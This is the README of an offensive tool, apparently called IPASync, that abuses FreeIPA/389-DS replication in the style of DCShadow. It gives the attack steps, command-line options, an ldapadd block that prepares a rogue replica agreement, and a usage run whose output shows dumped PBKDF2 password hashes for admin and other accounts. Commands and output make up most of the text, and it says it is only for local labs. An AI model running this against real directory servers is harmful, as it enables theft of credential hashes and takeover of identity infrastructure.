# IPASync

This is an analog of DCShadow for FreeIPA.

### Basic algorithm:
1) Start evil LDAP server
2) Add entry to LDAP (...,cn=mapping tree,cn=Config)
3) Wait a start of replication
4) Stop evil LDAP server
5) Delete entry from LDAP (...,cn=mapping tree,cn=Config)

### Waring: The LDAP server must have access to your port to connect.

There should also be an entry in LDAP cn=replica,cn=dc\=test\,dc\=local,cn=mapping tree,cn=Config. Or you should create it yourself.

### Options:
```
Add LDAP replication agreement entry with automatic DN construction

options:
  -h, --help            show this help message and exit
  -d, --debug           Enable debug mode (default: False)
  -t TIMEOUT, --timeout TIMEOUT
                        Timeout in seconds for wait for replication (default: 5)
  -H LDAP_URL, --ldap-url LDAP_URL
                        LDAP server url (ldap://...)
  -u BIND_DN, --bind-dn BIND_DN
                        Bind DN for authentication
  -p BIND_PW, --bind-pw BIND_PW
                        Bind password
  --replica-host REPLICA_HOST
                        Replica host IP
  --replica-port REPLICA_PORT
                        Replica port (default: 389)
  --replica-root REPLICA_ROOT
                        Replica root (e.g. dc=test,dc=local) (default: None)
  -a ALL, --all ALL     Dump all data to file (-a /path/to/file). By default only password hash.
```

Only for testing in local laboratories!

### Usage example:
```
python ipa_sync.py --ldap-url ldap://dc1.test.local --bind-dn uid=admin,cn=users,cn=accounts,dc=test,dc=local --bind-pw 'P@ssw0rd' --replica-port 3389 --replica-root dc=test,dc=local -t 7 --replica-host 10.10.10.10
Successfully added entry: cn=dcsync,cn=replica,cn=dc\3Dtest\2Cdc\3Dlocal,cn=mapping tree,cn=config
Added complete. Start LDAP server.
Wait replication...
[*] preserved_user@TEST.LOCAL:
[*] uid=sudo,cn=sysaccounts,cn=etc,dc=test,dc=local:{PBKDF2-SHA512}10000$krdW...jFBL3YSBfqkMNUn9oGYS2IUtYwawfxSRZehiOt9wyvuB2IJH9pNez0dQ==
[*] admin@TEST.LOCAL:{PBKDF2-SHA512}100000$2MOEbZSzdTCsU1z4wF903jSAjVHaEKpi$Yks...x4IRs4rSwoiCjMcdpN97AIHgQLj6c7lAepRuWrteNdoS7UXSivw==
[*] ivanov@TEST.LOCAL:{PBKDF2-SHA512}100000$QUAh31ewIp3oue+pHyC2bUM5al9sEdyO$25E...Anp2M8seTot6vxcSZef4CFc8mxV9v6g/5WOvuNnHARXGrDhjRLaA==
Server terminated. Delete replication agreement
LDAP error during deletion: error receiving data: timed out
```


### Before start


```
$ ldapadd -H ldap://dc1.test.local
dn: cn=replica,cn="dc=test,dc=local",cn=mapping tree,cn=config
changetype: add
objectClass: nsDS5Replica
objectClass: top
nsDS5ReplicaId: 2
nsDS5ReplicaRoot: dc=test,dc=local
cn: replica
nsDS5Flags: 1
nsDS5ReplicaBindDN: cn=replication manager,cn=config
nsds5ReplicaChangeCount: 0
nsDS5ReplicaType: 3
```
